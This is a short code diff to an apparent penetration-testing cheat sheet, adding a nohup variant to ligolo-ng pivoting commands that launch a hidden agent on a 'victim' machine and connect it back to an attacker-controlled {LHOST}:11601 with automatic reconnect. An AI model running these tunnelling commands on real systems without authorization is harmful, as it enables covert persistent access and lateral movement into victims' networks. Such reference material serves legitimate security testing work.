@@ -772,6 +772,7 @@ EOF
       { cmd: `# In victim shell`, category: 'ligolo-ng' },
       { cmd: `powershell.exe -c "Start-Process -FilePath '.\\agent.exe' -ArgumentList '-connect {LHOST}:11601 -ignore-cert -retry -reconnect' -WindowStyle Hidden"`, category: 'ligolo-ng' },
       { cmd: `./agent -connect {LHOST}:11601 -ignore-cert -retry -reconnect &`, category: 'ligolo-ng' },
+      { cmd: `nohup ./agent -connect {LHOST}:11601 -ignore-cert -retry -reconnect > agent.log 2>&1 &`, category: 'ligolo-ng' },
       { cmd: ``, category: 'ligolo-ng' },
       { cmd: `# In ligolo`, category: 'ligolo-ng' },
       { cmd: `session`, category: 'ligolo-ng' },
